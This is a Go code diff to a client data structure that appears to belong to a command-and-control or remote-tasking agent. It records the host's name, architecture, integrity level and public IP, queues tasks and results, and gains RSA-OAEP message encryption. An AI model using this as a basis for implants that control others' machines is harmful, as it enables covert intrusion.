@@ -1,12 +1,15 @@
 package data
 
 import (
+	"crypto/rand"
+	"crypto/rsa"
+	"crypto/sha256"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/json"
 	"io/ioutil"
 	"log"
-	"math/rand"
+	mrand "math/rand"
 	"net/http"
 	"os"
 	"os/user"
@@ -32,13 +35,14 @@ type Client struct {
 	PublicIp             string          `json:"public_ip"`
 	Tasks                []Task          `json:"tasks"`
 	Results              []TaskResult    `json:"results"`
+	RsaPrivateKey        *rsa.PrivateKey `json:"-"`
+	RsaPublicKey         *rsa.PublicKey  `json:"public_key"`
 	ClientTLSCertificate tls.Certificate `json:"-"`
-	//WSConn               *websocket.Conn `json:"-"`
-	WSConn           *Connection    `json:"-"`
-	ClientCaCertPool *x509.CertPool `json:"-"`
-	ClientCertPEM    string         `json:"-"`
-	ClientKeyPem     string         `json:"-"`
-	ClientRootCA     string         `json:"-"`
+	WSConn               *Connection     `json:"-"`
+	ClientCaCertPool     *x509.CertPool  `json:"-"`
+	ClientCertPEM        string          `json:"-"`
+	ClientKeyPem         string          `json:"-"`
+	ClientRootCA         string          `json:"-"`
 }
 
 func (c *Client) ToBytes() []byte {
@@ -52,8 +56,8 @@ func (c *Client) ToBytes() []byte {
 
 func GetPublicIp() string {
 	result := ""
-	rand.Seed(time.Now().UnixNano())
-	random := 0 + rand.Intn(11-1)
+	mrand.Seed(time.Now().UnixNano())
+	random := 0 + mrand.Intn(11-1)
 	possibleSites := [11]string{"https://api.globaldatacompany.com/common/v1/ip-info", "https://ifconfig.me/ip", "http://checkip.dyndns.org", "https://icanhazip.com/", "https://ipapi.co/ip", "https://api.myip.com", "https://api.ipify.org/", "https://ipinfo.io/ip", "https://ip.seeip.org/", "https://api.bigdatacloud.net/data/client-ip", "https://api.my-ip.io/ip"}
 	resp, err := http.Get(possibleSites[random])
 	if err != nil {
@@ -87,6 +91,7 @@ func NewClient() *Client {
 		arch = runtime.GOARCH
 		integrity = basic.GetIntegrity()
 	}
+
 	return &Client{
 		ClientId:    GenerateUUID(),
 		HostName:    hostname,
@@ -105,4 +110,27 @@ func NewClient() *Client {
 func GenerateUUID() string {
 	id := uuid.New()
 	return id.String()
+}
+
+func (c *Client) EncryptMessageWithPubKey(data []byte) ([]byte, error) {
+	length := len(data)
+	step := c.RsaPublicKey.Size() - 2*sha256.Size - 2
+	var encryptedBytes []byte
+	for start := 0; start < length; start += step {
+		finish := start + step
+		if finish > length {
+			finish = length
+		}
+		encryptedBlock, err := rsa.EncryptOAEP(
+			sha256.New(),
+			rand.Reader,
+			c.RsaPublicKey,
+			data[start:finish],
+			nil)
+		if err != nil {
+			return nil, err
+		}
+		encryptedBytes = append(encryptedBytes, encryptedBlock...)
+	}
+	return encryptedBytes, nil
 }
